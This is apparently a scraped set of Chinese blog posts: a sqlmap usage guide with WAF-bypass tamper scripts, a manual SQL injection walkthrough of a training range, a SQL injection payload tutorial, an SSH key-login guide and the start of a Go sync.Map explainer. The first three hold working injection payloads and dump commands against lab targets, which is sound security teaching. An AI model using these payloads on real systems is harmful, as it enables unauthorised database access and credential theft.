储存数据的方式（CSV(default)，HTML，SQLITE） \u0026ndash;flush-session 刷新当前目标的会话文件 \u0026ndash;fresh-queries 忽略会话文件中储存的查询结果，重新查询 \u0026ndash;hex 使用DBMS hex函数进行数据检索 \u0026ndash;outpout-dir 自定义输出目录 \u0026ndash;save 保存选项到 ini 配置文件中 \u0026ndash;scope 使用正则表达式从提供的日志中提取信息 \u0026ndash;alert 再找到SQL注入时运行主机操作系统命令 \u0026ndash;purge-output 安全的从输出目录中删除所有内容 \u0026ndash;sqlmap-shell 提示输入交互式sqlmap shell \u0026ndash;update 更新sqlmap 2. 信息显示设置 参数 功能 -h 设置显示信息等级（0-6 默认 1） 0 只显示 Python 错误以及重要信息 1 显示信息以及警告 2 显示 debug 消息 3 显示注入 payload 4 显示 http 请求 5 显示 http 响应头 6 显示 http 响应内容 3. 注入目标 参数 功能 -u 指定目标 url -d 直接连接数据库 -l 从 BurpSuit 代理日志的解析目标 -r 从文件中加载 http 请求 -g 从 google dork 的结果作为目标 url -c 从 ini 配置文件中加载选项 4. 请求头 参数 功能 -A 指定 User-Agent 头 -H 额外的 header -method 指定 HTTP 方法（GET/POST） \u0026ndash;data 通过 POST 提交数据 \u0026ndash;param-del 指定参数分隔符 \u0026ndash;cookie 指定 cookie 的值 \u0026ndash;cookie-del 指定cookie分隔符 \u0026ndash;drop-set-cookie 扔掉 response 中的 set-cookie 头 \u0026ndash;random-agent 使用随机的 User-Agent 头 \u0026ndash;host 设置 host 头 \u0026ndash;referer 指定 referer 头 \u0026ndash;headers 额外的headers \u0026ndash;auth-type http认证类型（Basic，NTLM，Digest） \u0026ndash;auith-cred http认证凭证（账号：密码） \u0026ndash;ignore-proxy 忽略系统代理（常用于扫描本地文件） \u0026ndash;proxy 使用代理 \u0026ndash;proxy-cred 代理认证证书（账号：密码） \u0026ndash;delay 设置两个请求之间延迟时间 \u0026ndash;timeout 超时时来连接前等待（默认 30） \u0026ndash;retries 连接超时时重试次数（默认 3） \u0026ndash;randomize 随机更改指定的参数的值 \u0026ndash;safe-url 在测试期间经常访问的 URL \u0026ndash;safe-post POST数据发送到安全的 URL \u0026ndash;safe-freq 两次请求之间穿插一个安全的URL \u0026ndash;skip-urlencode 跳过 payload 数据的 URL 编码 \u0026ndash;chunked 使用 HTTP 分块传输加密 POST 请求 \u0026ndash;hpp 使用HTTP参数pollution方法（常用于绕过IPS/IDS检测） \u0026ndash;force-ssl 强制使用 SSL/HTTPS \u0026ndash;eval=value 请求之前提供Python代码（eg：\u0026ldquo;import hashlib;id2=hashlib.md5(id).hexdigest()\u0026quot;） 5. 优化参数 参数 功能 -o 打开所有优化开关 \u0026ndash;predict-output 预测输出（与\u0026ndash;threads不兼容） \u0026ndash;keep-alive 建立长久的HTTP(S)连接 (与\u0026ndash;proxy不兼容) \u0026ndash;null-connection 空连接 \u0026ndash;threads=value 设置线程(默认 1) 6. 注入参数 参数 功能 -p 指定测试参数 \u0026ndash;skip 跳过指定参数的测试 \u0026ndash;skip-static 跳过测试静态的参数 \u0026ndash;dbms 指定具体DBMS \u0026ndash;os 指定DBMS操作系统 \u0026ndash;invalid-bignum 使用大数字使值无效 \u0026ndash;invalid-logical 使用逻辑符使值无效 \u0026ndash;invalid-string 使用字符串使值无效 \u0026ndash;no-cast 关闭payload铸造机制 \u0026ndash;no-escape 关闭字符转义机制（默认自动开启） \u0026ndash;prefix 加入payload前缀 \u0026ndash;suffix 加入payload后缀 \u0026ndash;tamper 指定使用的脚本，多个脚本之间用空格隔开 7. 检测 参数 功能 \u0026ndash;level 指定测试的等级（1-5 默认为1） \u0026ndash;risk 指定测试的风险（0-3 默认为1） \u0026ndash;string 登录成功时，页面所含有的“关键字” 用于证明已经登录成功 \u0026ndash;not-string 登录成功时，页面所含有的“关键字” 用于证明已经登录失败 \u0026ndash;code 查询为真时，匹配的HTTP代码 \u0026ndash;smart 当有大量检测目标时，只选择基于错误的检测结果 \u0026ndash;text-only 仅基于文本内容比较网页 \u0026ndash;titles 仅基于标题比较网页 8. 注入技术 参数 功能 -technique 指定sql注入技术（默认BEUSTQ） \u0026ndash;time-sec 基于时间注入检测相应的延迟时间（默认为5秒） \u0026ndash;union-clos 进行查询时，指定列的范围 \u0026ndash;union-char 指定暴力破解列数的字符 参数 功能 B 基于布尔的盲注 T 基于时间的盲注 E 基于报错的注入 U 基于UNION查询注入 S 基于多语句查询注入 9. 指纹查询 参数 功能 -f 查询目标DBMS版本指纹信息 10. 数据查询 参数 功能 -a 查询所有 -b 查询目标 DBMS banner 信息 \u0026ndash;current-user 查询目标DBMS当前用户 \u0026ndash;current-db 查询目标 DBMS 当前数据库 \u0026ndash;is-dba 查询目标 DBMS 当前用户是否为 DBA \u0026ndash;users 枚举目标 DBMS 所有的用户 \u0026ndash;paswords 枚举目标 DBMS 用户密码哈希值 \u0026ndash;privileges 枚举目标 DBMS 用户的权限 \u0026ndash;roles 枚举DBMS用户的角色 \u0026ndash;dbs 枚举DBMS所有的数据库 \u0026ndash;tables 枚举DBMS数据库中所有的表 \u0026ndash;columns 枚举DBMS数据库表中所有的列 \u0026ndash;count 检索表的条目的数量 \u0026ndash;dump 存储DBMS数据库的表中的条目 \u0026ndash;dump-all 存储DBMS所有数据库表中的条目 \u0026ndash;D db 指定进行枚举的数据库名称 \u0026ndash;T table 指定进行枚举的数据库表名称 \u0026ndash;C column 指定进行枚举的数据库列名称 \u0026ndash;exclude-sysdbs 枚举表时排除系统数据库 \u0026ndash;sql-query 指定查询的sql语句 \u0026ndash;sql-shell 提示输入一个交互式sql shell 11. 暴力破解 参数 功能 \u0026ndash;common-tables 暴力破解表 \u0026ndash;common-colomns 暴力破解列 12. 文件系统访问 参数 功能 \u0026ndash;file-read 从目标数据库管理文件系统读取文件 \u0026ndash;file-write 上传文件到目标数据库管理文件系统 \u0026ndash;file-dest 指定写入文件的绝对路径 \u0026ndash;os-cmd 执行操作系统命令 \u0026ndash;os-shell 交互式的系统shell \u0026ndash;os-pwn 获取一个OOB shell，Meterpreter或者VNC \u0026ndash;os-smbrelay 一键 获取一个OOB shell，Meterpreter或者VNC \u0026ndash;os-bof 储存过程缓冲区溢出利用 \u0026ndash;os-esc 数据库进程用户权限提升 \u0026ndash;msf-path= Metasploit Framework本地安装路径 二、WAF 绕过 WAF，即Web Application Firewall，即Web应用防火墙，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。\n我们可以使用--identify-waf参数对一些网站是否有安全防护进行试探。当确定网站存在 WAF 之后我们需要对其进行绕过。\n在 sqlmap 下的 tamper 目录中存放着绕过 WAF 脚本。通过 --tamper 参数使用脚本，多个 tamper 脚本之间用空格隔开。\n1. 自带 tamper 在 Kali 2020 的系统中，tamper 文件夹位置为：/usr/share/sqlmap/tamper。\n适用数据库 模块 功能 环境 ALL apostrophemask.py 对单引号'用URL-UTF8编码 ALL apostrophenullencode.py 对单引号'用非法的双UNICODE编码 ALL unmagicquotes.py 将单引号'替换成多个字节 并在结尾处添加注释符 ALL escapequotes.py 斜杠转义单引号'和双引号\u0026quot; ALL base64encode.py 对payload进行一次BASE64编码 * Microsoft SQL Server 2000 * Microsoft SQL Server 2005 * MySQL 5.1.56 * PostgreSQL 9.0.3 charunicodeencode.py 对payload进行一次URL-UNICODE编码 * ASP * ASP.NET ALL charunicodeescape.py 对payload进行UNICODE格式转义编码 ALL htmlencode.py 对payload中非字母非数字字符进行HTML编码 * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 charencode.py 对payload进行一次URL编码 ALL chardoubleencode.py 对payload进行两次URL编码 ALL overlongutf8.py 将payload中非字母非数字字符用超长UTF8编码 ALL overlongutf8more.py 将payload中所有字符用超长UTF8编码 * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 equaltolike.py 将payload中所有=替换成LIKE * MySQL 4, 5.0 and 5.5 equaltorlike.py 将payload中所有=替换成RLIKE * MySQL 5.1, SGOS bluecoat.py 将SQL语句中空格字符' '替换为%09 并替换=为LIKE * MSSQL * SQLite space2dash.py 将空格字符' '替换成：--+随机字符串+\\n * MySQL space2hash.py 将MySQL payload中空格字符' '替换成： #+随机字符串+\\n * MySQL \u0026gt;= 5.1.13 space2morehash.py 将MySQL payload中空格字符' '替换成： #+随机字符串+\\n * Microsoft SQL Server space2mssqlblank.py 将MsSQL payload中空格字符' '替换成 随机的空字符：(%01, %02, %03, %04···%0F) * MSSQL * MySQL space2mssqlhash.py 将MySQL payload中空格字符' '替换成：#+\\n * MySQL space2mysqlblank.py 将MySQL payload中空格字符' '替换成 随机的空字符：(%09, %0A, %0B, %0C, %0D) * MySQL * MSSQL space2mysqldash.py 将MySQL payload中空格字符' '替换成：--+\\n ALL space2plus.py 将空格字符' '替换成+ * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 space2randomblank.py 将空格字符' '替换成随机的空字符： (%09, %0A, %0C, %0D) * MySQL * MsSQL 0eunion.py UNION语句替换 ALL unionalltounion.py UNION语句替换 * MySQL misunion.py UNION语句替换 * Oracle dunion.py UNION语句替换 * MySQL sleep2getlock.py SLEEP语句替换 * MySQL * SQLite (possibly) * SAP MaxDB (possibly) ifnull2casewhenisnull.py IFNULL语句替换 * MySQL * SQLite (possibly) * SAP MaxDB (possibly) ifnull2ifisnull.py IFNULL语句替换 * MySQL commalesslimit.py MySQL payload中LIMIT语句替换 * MySQL commalessmid.py MySQL payload中MID语句替换 * MySQL hex2char.py MySQL payload中CONCAT(CHAR(),…)语句替换 * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 between.py 用BETWEEN语句替换=\u0026lt;\u0026gt;号 * MySQL concat2concatws.py MySQL payload中CONCAT语句替换 * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 space2comment.py 将空格字符' '替换成注释符/**/ * MySQL 5.0 and 5.5 space2morecomment.py 将MySQL payload中空格字符' '替换成 注释符/**_**/ * Microsoft SQL Server * MySQL * Oracle * PostgreSQL commentbeforeparentheses.py 在括号前加上/**/注释 * MySQL \u0026lt; 5.1 halfversionedmorekeywords.py 在关键字前添加MySQL版本注释信息 * MySQL modsecurityversioned.py 用注释来包围完整的MySQL查询语句 * MySQL modsecurityzeroversioned.py 用注释来包围完整的MySQL查询语句 ALL randomcomments.py 在SQL关键字的字符之间随机添加注释符 * MySQL versionedkeywords.py 对MySQL payload中非函数的关键字进行注释 * MySQL \u0026gt;= 5.1.13 versionedmorekeywords.py 对MySQL payload中所有关键字进行注释 * Microsoft Access appendnullbyte.py 在payload结束位置加零字节字符%00 * MySQL binary.py 在payload可能位置插入关键字binary * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 greatest.py \u0026gt;替换成GREATEST语句 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 least.py \u0026gt;替换成LEAST语句 ALL informationschemacomment.py 在\u0026quot;information_schema\u0026quot;后面加上/**/ * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 lowercase.py 将所有大写字符替换成小写字符 * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 uppercase.py 将所有小写字符替换成大写字符 ALL multiplespaces.py 在SQL关键字旁添加多个空格符' ' * Microsoft SQL Server 2000, 2005 * MySQL 5.1.56, 5.5.11 * PostgreSQL 9.0 percentage.py payload中每个字符前加% * ASP * Microsoft SQL Server 2012+ plus2concat.py 将+替换成MsSQL的CONCAT()语句 * Microsoft SQL Server 2008+ plus2fnconcat.py 将+替换成MsSQL的{fn CONCAT()}语句 * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 * SQLite 3 randomcase.py 对每个SQL关键字的字符替换成随机大小写 * MySQL schemasplit.py 拆分数据库标识符 * MSSQL sp_password.py 在MsSQL payload后添加ssp_password 用于混淆数据库日志 * PostgreSQL 9.6.12 substring2leftright.py 将PostgreSQL中SUBSTRING语句 用LEFT和RIGHT代替 ALL symboliclogical.py 将AND和OR替换成\u0026amp;\u0026amp;和` ALL luanginx.py 针对LUA-Nginx WAF进行绕过 ALL varnish.py 添加一个HTTP头X-originating-IP 用来绕过Varnish防火墙 ALL xforwardedfor.py 添加伪造的HTTP头X-Forwarded-For 三、使用小技巧 注入的请求必须是正确的请求，例如测试登录时必须要使用能够正常登录的账号密码； 当我们知道哪里存在注入点时，我们可以在注入点加上 * 来标识这是一个注入点； 四、sqlmap 使用示例 1. 获取所有数据库 1 2 3 4 5 6 7 8 9 10 11 Input: sqlmap -u \u0026#34;http://192.168.1.200:9080/Less-1/?id=1\u0026#34; --batch --dbs Output: ailable databases [5]: [*] challenges [*] information_schema [*] mysql [*] performance_schema [*] security 参数解读：\n-u：指定测试的 url \u0026ndash;batch：使用所有默认选项 \u0026ndash;dbs：获取所有数据库 2. 获取指定数据库的所有表 1 2 3 4 5 6 7 8 9 10 11 12 Input: sqlmap -u \u0026#34;http://192.168.1.200:9080/Less-1/?id=1\u0026#34; --batch -D security --tables Output: Database: security [4 tables] +----------+ | emails | | referers | | uagents | | users | +----------+ 3. 获取指定表的所有列名 1 2 3 4 5 6 7 8 9 10 11 12 13 14 Input: sqlmap -u \u0026#34;http://192.168.1.200:9080/Less-1/?id=1\u0026#34; --batch -D security -T users --columns Output: Database: security Table: users [3 columns] +----------+-------------+ | Column | Type | +----------+-------------+ | id | int(3) | | password | varchar(20) | | username | varchar(20) | +----------+-------------+ 4. 获取指定列的值 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 Input: sqlmap -u \u0026#34;http://192.168.1.200:9080/Less-1/?id=1\u0026#34; --batch -D security -T users -C \u0026#34;username,password\u0026#34; --dump Output: Database: security Table: users [14 entries] +----------+----------+ | username | password | +----------+----------+ | Dumb | password | | Angelina | password | | Dummy | password | | secure | password | | stupid | password | | superman | password | | batman | password | | admin | 123 | | admin1 | password | | admin2 | password | | admin3 | password | | dhakkan | password | | admin4 | password | | admin\u0026#39;#1 | 123 | +----------+----------+ ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/sqlmap-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/","title":"sqlmap 使用指南"},{"content":"SQL 手工注入漏洞测试（MySQL数据库） 题目信息： 背景介绍 安全工程师\u0026quot;墨者\u0026quot;最近在练习SQL手工注入漏洞，自己刚搭建好一个靶场环境Nginx+PHP+MySQL，PHP代码对客户端提交的参数未做任何过滤。尽情的练习SQL手工注入吧 实训目标 1.掌握SQL注入原理； 2.了解手工注入的方法； 3.了解MySQL的数据结构； 4.了解字符串的MD5加解密 解题方向 手工进行SQL注入测试，获取管理密码登录。\n一、进入靶场 本题要求为SQL注入，那么我们就先去寻找注入点而不是直接爆破用户名和密码。 二、在公告处发现注入点 三、确定注入格式 http://219.153.49.228:41317/new_list.php?id=1 and 1=1 \u0026raquo; 不报错，未过滤关键字 http://219.153.49.228:41317/new_list.php?id=1 and 1=1 \u0026raquo; 报错，发现注入点 四、确定字段数 http://219.153.49.228:41317/new_list.php?id=1order by 1 \u0026raquo; 不报错 http://219.153.49.228:41317/new_list.php?id=1order by 2 \u0026raquo; 不报错 http://219.153.49.228:41317/new_list.php?id=1order by 3 \u0026raquo; 不报错 http://219.153.49.228:41317/new_list.php?id=1order by 4 \u0026raquo; 不报错 http://219.153.49.228:41317/new_list.php?id=1order by 5 \u0026raquo; 报错 确定字段数为4\n五、确定显示字段 http://219.153.49.228:41317/new_list.php?id=-1 union select 1,2,3,4 确定显示字段为2和3。\n六、查询数据库名字和版本 http://219.153.49.228:41317/new_list.php?id=-1 union select 1,database(),version(),4 确定数据库名字为 mozhe_Discuz_StormGroup ，数据库版本为 5.7.22-0ubuntu0.16.04.1 。 七、查询其它数据库名称 http://219.153.49.228:41317/new_list.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata limit 0,1 \u0026raquo; information_schema http://219.153.49.228:41317/new_list.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1 \u0026raquo; mozhe_Discuz_StormGroup http://219.153.49.228:41317/new_list.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata limit 2,1 \u0026raquo; mysql http://219.153.49.228:41317/new_list.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata limit 3,1 \u0026raquo; performance_schema http://219.153.49.228:41317/new_list.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata limit 4,1 \u0026raquo; sys 八、查询数据库表名 http://219.153.49.228:41317/new_list.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup' limit 0,1\u0026raquo;StormGroup_member http://219.153.49.228:41317/new_list.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup' limit 1,1\u0026raquo;notice 根据表名我们可以发现，StormGroup_member这张表放的是用户信息，notice这张表中放的是公告信息 九、查询表中字段名 http://219.153.49.228:41317/new_list.php?id=-1 union select 1,column_name,column_type,4 from information_schema.columns where table_name='StormGroup_member' limit 0,1\u0026raquo;id, int(11) http://219.153.49.228:41317/new_list.php?id=-1 union select 1,column_name,column_type,4 from information_schema.columns where table_name='StormGroup_member' limit 0,1\u0026raquo;name, varchar(20) http://219.153.49.228:41317/new_list.php?id=-1 union select 1,column_name,column_type,4 from information_schema.columns where table_name='StormGroup_member' limit 0,1\u0026raquo;password, varchar(255) http://219.153.49.228:41317/new_list.php?id=-1 union select 1,column_name,column_type,4 from information_schema.columns where table_name='StormGroup_member' limit 0,1\u0026raquo;status, int(11) 十、查询用户信息 http://219.153.49.228:41317/new_list.php?id=-1 union select 1,concat(name,'-',password,'-',status),3,4 from mozhe_Discuz_StormGroup.StormGroup_member limit 0,1\u0026raquo;mozhe-356f589a7df439f6f744ff19bb8092c0-0 http://219.153.49.228:41317/new_list.php?id=-1 union select 1,concat(name,'-',password,'-',status),3,4 from mozhe_Discuz_StormGroup.StormGroup_member limit 1,1\u0026raquo;mozhe-e2391899875e16f7013173cd17524303-1 查询出了两条记录，发现密码长度都为32位，猜测应该是md5加密的，将密码放进解密网站进行解密，使用用户名和密码登陆网站 十一、登陆成功 下方就是我们需要提交的key了\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95mysql%E6%95%B0%E6%8D%AE%E5%BA%93/","title":"SQL手工注入漏洞测试(MySQL数据库)"},{"content":"SQL 注入 一、数据类型 1. 数字型 当输入参数为整数时，如果存在注入漏洞，那么可以认为此处存在数字型注入\n例如：\n1 2 3 4 5 6 SQL模板： select * from table_name where id=$id; 注入： $id = 1 and 1=1 --+ select * from table_name where id=1 and 1=1 --+ 2. 字符型 当输入参数为字符时，如果存在注入漏洞，那么可以认为此处存在字符型注入。字符型注入是最常见的注入，字符型注入一般需要进行引号闭合\n例如：\n1 2 3 4 5 6 SQL模板： select * from table_name where name=\u0026#39;$name\u0026#39;; 注入： $name = \u0026#34;张三\u0026#39; and 1=1 --+\u0026#34; select * from table_name where name=\u0026#39;张三\u0026#39; and 1=1 --+; 3. 搜索型 当网站存在搜索功能时，如果存在注入点，那么可以认为此处存在搜索型注入。搜索型注入和字符型注入类似，需要闭合符号\n例如：\n1 2 3 4 5 6 SQL模板： select * from table_name where name like \u0026#39;%$name%\u0026#39;; 注入： $name = \u0026#34;三%\u0026#39; and 1=1 --+\u0026#34; select * from table_name where name like \u0026#39;%三%\u0026#39; and 1=1 --+; 二、注入方式 1. 联合查询注入 概念 联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合在一起\n示例 PS：本文都使用 sqli-labs 第一关作为示例！\n1 2 查询数据库版本和数据库名称： ?id=-1 union select 1, group_concat(version(), \u0026#39;---\u0026#39;,database()), 3 --+ 2. 报错回显注入 概念 一些网站在查询数据库时，没有关闭数据库查询出错时错误信息的输出。在SQL中的某些函数，在出错时会给出一些提示信息，报错回显注入就是利用这些函数来输出我们需要的结果\n注入函数 updatexml() 基本信息\nUPDATEXML (XML_document, XPath_string, new_value): 第一个参数：xml 文档 ; 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程; 第三个参数：替换查找到的符合条件的数据 ； 错误输出最大长度为32位。 注入使用格式\n1 updatexml(1, concat(0x7e, (注入语句), 0x7e), 1) 报错原因\n当第二个参数不符合 xpath 语法时，函数使用报错。\n示例\n1 ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(username) from users), 0x7e), 1) -- + extractvalue() 基本信息\nextractvalue(XML_document, XPath_string): XML_document：目标xml文档； XPath_string：Xpath字符串； 错误输出最大长度为32位。 注入使用格式\n1 extractvalue(\u0026#39;\u0026lt;a\u0026gt;\u0026lt;b\u0026gt;\u0026lt;b/\u0026gt;\u0026lt;/a\u0026gt;\u0026#39;,concat(0x7e,(注入语句), 0x7e)) 报错原因\n当第二个参数不符合 xpath 语法时，函数使用报错。\n示例\n1 ?id=1\u0026#39; and extractvalue(\u0026#39;\u0026lt;a\u0026gt;\u0026lt;b\u0026gt;\u0026lt;b/\u0026gt;\u0026lt;/a\u0026gt;\u0026#39;,concat(0x7e,(select group_concat(username) from users), 0x7e)) -- + floor() 基本信息\nfloor(): 去除小数部分； count(): 统计记录数目； rand(x): 产生随机数，每个x对应一个固定的值，但是如果连续执行多次值会变化，不过也是可预测的； group by: 对数据进行分组； 错误输出最大长度为64位。 注入使用格式\n1 (SELECT 1 FROM (SELECT count(*), concat((注入语句), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x) a) 报错原因\nMysql报错注入之floor(rand(0)*2)报错原理探究 - FreeBuf网络安全行业门户\n示例\n1 ?id=1\u0026#39; and (SELECT 1 FROM (SELECT count(*), concat((select table_name from information_schema.tables where table_schema=database() limit 0,1), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x) a) --+ exp() 基本信息\nexp(): 返回e 的 输入数次方； 错误输出最大长度为64位。 注入使用格式\n1 exp(~(select * from(注入语句) as a)) 报错原因\n当传递一个大于709的值时，函数exp()就会引起一个溢出错误。\n示例\n1 ?id=1\u0026#39; and exp(~(select * from(select group_concat(password) from users) as a)) --+ geometrycollection() 注入使用格式\n1 geometrycollection((select * from(select * from(注入语句)a)b)) 示例\n1 ?id=1\u0026#39; and geometrycollection((select * from(select * from(select user())a)b)) --+ multipoint() 注入使用格式\n1 multipoint((select * from(select * from(注入语句)a)b)) 示例\n1 ?id=1\u0026#39; and multipoint((select * from(select * from(select user())a)b)) --+ polygon() 注入使用格式\n1 polygon((select * from(select * from(注入语句a)b)) 示例\n1 ?id=1\u0026#39; and polygon((select * from(select * from(select database())a)b)) --+ multipolygon() 注入使用格式\n1 multipolygon((select * from(select * from(注入语句)a)b)) 示例\n1 ?id=1\u0026#39; and multipolygon((select * from(select * from(select user())a)b)) --+ linestring() 注入使用格式\n1 linestring((select * from(select * from(注入语句)a)b)) 示例\n1 ?id=1\u0026#39; and linestring((select * from(select * from(select user())a)b)) --+ multilinestring() 注入使用格式\n1 multilinestring((select * from(select * from(注入语句)a)b)) 示例\n1 ?id=1\u0026#39; and multilinestring((select * from(select * from(select user())a)b)) --+ 3. 布尔盲注 概念 布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false，从而达到注入的目的来获取信息\n常用函数 length()：返回字符串的长度； substr()：截取字符串； left()：从左至右截取字符串； ascii()：返回字符的 Ascii 码值； regexp()：正则表达式； ord()：返回字符串第一个字符的 Ascii 码值； mid()：从文本字段中提取字符； 示例\nPS：此处使用 sqli-labs 第8关进行演示。\n获取数据库名称长度\n?id=1\u0026#39; and length(database())=7 --+ ?id=1\u0026#39; and length(database())=8 --+ 获取数据库名称\n?id=1\u0026#39; and (left(database(), 1) = \u0026#39;s\u0026#39; ) --+ ?id=1\u0026#39; and (substr(database(), 2, 1) = \u0026#39;e\u0026#39; ) --+ ?id=1\u0026#39; and (substr(database(), 3, 1) = \u0026#39;c\u0026#39; ) --+ ?id=1\u0026#39; and (substr(database(), 4, 1) = \u0026#39;u\u0026#39; ) --+ ... 4. 基于时间的布尔盲注 时间盲注指通过页面执行的时间来判断数据内容的注入方式，通常用于数据（包含逻辑型）不能返回到页面中的场景，无法利用页面回显判断数据内容，只能通过执行的时间来获取数据。基于时间的布尔盲注就是在基于布尔的盲注上结合if判断和sleep（）函数来得到一个时间上的变换延迟的参照。\n示例\nPS：sqli-labs第9关\n?id=1\u0026#39; and if(length(database())\u0026gt;1, sleep(5), 0) --+ 三、注入位置 1. GET 注入点 url 中\n示例：sqli-labs：Less-1\n2. POST 注入点在 POST 提交的表单中\n示例：sqli-labs：Less-11\n3. Cookie 注入点位置在 Cookie 中\n示例：sqli-labs：Less-20\n四、注入拓展 1. 编解码注入 base64注入是针对传递的参数被base64加密后的注入点进行注入。\n2. JSON注入 JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON注入实际上就是注入点在 JSON 数据中。\n3. LADP 注入 LDAP(Lightweight Directory Access Protocol)：轻量级目录访问协议，是一种在线目录访问协议。LDAP主要用于目录中资源的搜索和查询，是X.500的一种简便的实现，是运行于TCP/IP之上的协议，端口号为：389， 加密636（SSL）\n4. DNSlog 注入 DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名www.baidu.com等的访问信息，类似日志文件。在利用sql盲注进行DNSlog回显时，需要用到load_file函数，这个函数可以进行DNS请求。DNSlog注入主要用于解决盲注时不能回显结果的问题。\n5. 二次注入 二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。\n示例：sqli-labs：Less-24\n6. 堆叠查询 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。\n而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。\n五、WAF 绕过 1. 大小写绕过 大小写绕过用于只针对小写或大写的关键字匹配技术，正则表达式/express/i 大小写不敏感即无法绕过，这是最简单的绕过技术。\n2. 替换关键字 为了绕过正则关键字匹配，我们可以采取替换关键词的方式进行绕过。\n3. 使用编码 （1）URL编码 （2) 十六进制编码 (3) Unicode编码 4. 使用注释 5. 等价函数与命令 6. 特殊符号 7. HTTP参数控制 8. 缓冲区溢出 9. 整合绕过 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/sql%E6%B3%A8%E5%85%A5/","title":"SQL注入"},{"content":"SSH 免密登录 前言 目标：Win10 免密登录 Centos\nPs：在配置 ssh 免密登录前首先要保证客户机和服务器之间能够互相 ping，并且开放客户机和服务器的 22 端口（也可以设置端口转发），先尝试一下使用 ssh 是否能够登录，再来配置 ssh 免密登录。\nWindows 打开 cmd，输入 ssh-keygen配置好信息，系统会自动为我们生成公钥和私钥。文件位于 C: \\Users\\(User)\\.ssh目录下，后续我们需要将id_rsa.pub文件上传至上传至服务器。\nLinux 同样是运行 ssh-keygen命令，并配置好信息，系统会为我们自动生成公钥和私钥。文件位于 /user/.ssh/ 文件夹下。\n配置文件 打开 Win10 的 cmd，利用 scp 命令将 id_rsa.pub 文件拷贝至 Linux 下，为了避免重名，我们将文件重命名一下：\n1 scp id_rsa.pub root@192.168.153.134:/root/.ssh/id_rsa.pub.win 进入 Linux 终端，进入 /root/.ssh/目录下，将id_rsa.pub.win文件写入 authorized_keys，如果文件夹下没有 authorized_keys文件，则自行创建：\n1 2 touch authorized_keys # 若没有文件则创建一个 cat id_rsa.pub.win \u0026gt;\u0026gt; authorized_keys # 追加内容到 authorized_keys 文件 此时再次打开 cmd，尝试 ssh 登录，发现此时已经不需要密码了。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/ssh-%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/","title":"ssh 免密登录"},{"content":"sync.Map 详解 在 src\\sync\\map.go存放在 sync.Map 的所有代码。\n结构 先看一下这里面有哪些结构体：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 type Map struct { mu Mutex read atomic.Pointer[readOnly] dirty map[any]*entry misses int } type readOnly struct { m map[any]*entry amended bool } type entry struct { p atomic.Pointer[any] } 下面对每个结构体进行分析：\nMap 结构：Map 结构是主要结构体，其中包含以下字段：\n有一个 Mutex 互斥锁，用来保护 read 和 dirty的写操作； 一个 read 字段，为 atomic.Pointer[readOnly]类型，可以并发读，但是需要更新 read 时，需要进行加锁。对于 read 中的存储的 entry字段，可以被并发地被 CAS 更新； 一个 dirty 字段，为原始的 map类型，用来写入数据。包含完整的数据； misses字段用来统计 read未击中的次数，当次数达到 